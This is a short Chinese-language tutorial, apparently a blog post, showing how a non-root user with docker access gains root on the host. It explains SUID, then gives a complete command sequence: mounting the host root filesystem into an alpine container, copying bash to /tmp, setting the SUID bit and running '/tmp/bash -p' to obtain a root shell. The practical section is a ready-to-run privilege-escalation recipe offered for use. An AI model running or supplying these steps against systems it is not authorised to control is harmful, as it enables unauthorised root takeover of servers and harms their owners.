Linux有docker非root时提权

在linux服务器中经常会遇到当前账户可以操作docker但是非root权限的情况，本文将介绍一种简单快捷的方法拿到宿主机的root权限

背景#

首先查看当前用户权限是否包含docker,下面这样就是包含docker权限

> id
uid=111(test) gid=113(test) groups=113(test),988(docker)

有时候查看当前权限没有显示docker像下面这样，实际也能操作docker

> id
uid=111(test) gid=113(test) groups=113(test)

所以直接执行docker ps 查看是最直接的

SUID bash提权#

什么是SUID#

在 Linux 系统中，SUID（Set User ID） 是一种特殊的文件权限位，用于临时赋予用户执行文件时以文件所有者的身份运行的权限（而不是当前用户的身份）。这种权限通常用于允许普通用户执行某些需要更高权限的操作。

说白了就是以非root用户权限执行SUID文件，该文件的实际权限还是root。

这时候思路就来了，我们通过映射宿主机中的bash到容器中，再通过容器中的root权限将该bash设置SUID权限，然后将该文件拿到宿主机中执行即可拿到root权限

实践#

首先将宿主机根目录映射到容器中，然后在容器中将宿主机中的bash复制到/tmp目录，然后将该文件赋予SUID权限，最后退出容器在宿主机中执行该文件

test> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
> cp /bin/bash /tmp/bash
> chmod +s /tmp/bash
> exit # 退出当前chroot的shell
> exit # 退出当前容器的shell

test> /tmp/bash -p # 当前文件已经设置好SUID权限，所以直接执行即可获得root权限
> whoami
root

该方法相对计划任务或其他方式提root更简单直接
